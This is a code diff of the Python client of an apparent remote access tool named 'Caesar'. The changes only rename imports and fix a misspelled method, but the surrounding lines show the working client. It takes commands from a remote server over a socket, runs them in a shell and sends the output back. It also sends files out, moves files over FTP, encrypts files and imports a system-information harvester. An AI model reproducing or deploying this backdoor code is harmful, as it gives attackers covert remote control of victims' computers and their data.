@@ -2,8 +2,8 @@ import socket
 import time
 import os
 import subprocess
-from GeneralFeatures import GeneralFeatures
-from SystemInfoHarvester import SystemInfoHarvester
+from general_features import GeneralFeatures
+from systeminfo_harvester import SystemInfoHarvester
 import winreg
 import sys
 
@@ -75,7 +75,7 @@ class CaesarClient:
         while True:
             cmd = sock.recv(65536).decode()
             if cmd == " ":
-                sock.send(self.generalFeatures.convvert_text_bold_red("Caesar ").encode() + str(os.getcwd() + ": ").encode()) #send current working directory back to server
+                sock.send(self.generalFeatures.convert_text_bold_red("Caesar ").encode() + str(os.getcwd() + ": ").encode()) #send current working directory back to server
             elif cmd[:2] == 'cd':
                 #change directory
                 try:
@@ -85,11 +85,11 @@ class CaesarClient:
                     result = "\n" + result.decode()
                     if "The system cannot find the path specified." in result:
                         result = "\n"
-                        sock.send(str(result).encode() + self.generalFeatures.convvert_text_bold_red("Caesar ").encode() + str(os.getcwd() + ": ").encode())
+                        sock.send(str(result).encode() + self.generalFeatures.convert_text_bold_red("Caesar ").encode() + str(os.getcwd() + ": ").encode())
                     else:
-                        sock.send(str(result).encode() + self.generalFeatures.convvert_text_bold_red("Caesar ").encode() + str(os.getcwd() + ": ").encode())
+                        sock.send(str(result).encode() + self.generalFeatures.convert_text_bold_red("Caesar ").encode() + str(os.getcwd() + ": ").encode())
                 except(FileNotFoundError, IOError):
-                    sock.send("Directory does not exist!!! \n".encode() + self.generalFeatures.convvert_text_bold_red("Caesar ").encode() + str(os.getcwd() + ": ").encode())
+                    sock.send("Directory does not exist!!! \n".encode() + self.generalFeatures.convert_text_bold_red("Caesar ").encode() + str(os.getcwd() + ": ").encode())
             elif "get" in cmd:
                 self.generalFeatures.send_client_file(sock, cmd[4:])
 
@@ -125,7 +125,7 @@ class CaesarClient:
                     self.generalFeatures.download_file_via_ftp(sock, "".join(cmd[2]), cmd[3], cmd[4], cmd[5], cmd[6], cmd[7])
 
                 elif len(cmd) > 8 or len(cmd) < 8:
-                    sock.send("[-] Invalid command!!! \n".encode() + self.generalFeatures.convvert_text_bold_red('Caesar ').encode() + str(os.getcwd() + ": ").encode())
+                    sock.send("[-] Invalid command!!! \n".encode() + self.generalFeatures.convert_text_bold_red('Caesar ').encode() + str(os.getcwd() + ": ").encode())
 
 
             elif "ftp upload" in cmd:
@@ -134,7 +134,7 @@ class CaesarClient:
                     self.generalFeatures.upload_file_via_ftp(sock, "".join(cmd[2]), cmd[3], cmd[4], cmd[5], cmd[6], cmd[7])
 
                 elif len(cmd) > 8 or len(cmd) < 8:
-                    sock.send("[-] Invalid command!!! \n".encode() + self.generalFeatures.convvert_text_bold_red('Caesar ').encode() + str(os.getcwd() + ": ").encode())
+                    sock.send("[-] Invalid command!!! \n".encode() + self.generalFeatures.convert_text_bold_red('Caesar ').encode() + str(os.getcwd() + ": ").encode())
 
             elif "encrypt" in cmd:
                 cmd = cmd.split(" ", 2)
@@ -142,7 +142,7 @@ class CaesarClient:
                 if len(cmd) == 3:
                     self.generalFeatures.encrypt_file(sock, "".join(cmd[1]), "".join(cmd[2]))
                 elif len(cmd) > 3 or len(cmd) < 3:
-                    sock.send("[-] Invalid command!!! \n".encode() + self.generalFeatures.convvert_text_bold_red('Caesar ').encode() + str(os.getcwd() + ": ").encode())
+                    sock.send("[-] Invalid command!!! \n".encode() + self.generalFeatures.convert_text_bold_red('Caesar ').encode() + str(os.getcwd() + ": ").encode())
 
 
             elif "decrypt" in cmd:
@@ -150,7 +150,7 @@ class CaesarClient:
                 if len(cmd) == 3:
                     self.generalFeatures.decrypt_file(sock, "".join(cmd[1]), "".join(cmd[2]))
                 elif len(cmd) > 3 or len(cmd) < 3:
-                    sock.send("[-] Invalid command!!! \n".encode() + self.generalFeatures.convvert_text_bold_red('Caesar ').encode() + str(os.getcwd() + ": ").encode())
+                    sock.send("[-] Invalid command!!! \n".encode() + self.generalFeatures.convert_text_bold_red('Caesar ').encode() + str(os.getcwd() + ": ").encode())
 
 
             elif cmd == "conn check":
@@ -165,7 +165,7 @@ class CaesarClient:
 
                     terminal_output = terminal_output.stdout.read() + terminal_output.stderr.read()
                     terminal_output = terminal_output.decode()
-                    sock.send(str(terminal_output).encode() + self.generalFeatures.convvert_text_bold_red("Caesar ").encode() + str(os.getcwd() + ": ").encode())
+                    sock.send(str(terminal_output).encode() + self.generalFeatures.convert_text_bold_red("Caesar ").encode() + str(os.getcwd() + ": ").encode())
                 except Exception as e:
-                    sock.send(str(e).encode() + "\n".encode() + self.generalFeatures.convvert_text_bold_red("Caesar ").encode() + str(os.getcwd() + ": ").encode())
+                    sock.send(str(e).encode() + "\n".encode() + self.generalFeatures.convert_text_bold_red("Caesar ").encode() + str(os.getcwd() + ": ").encode())
 
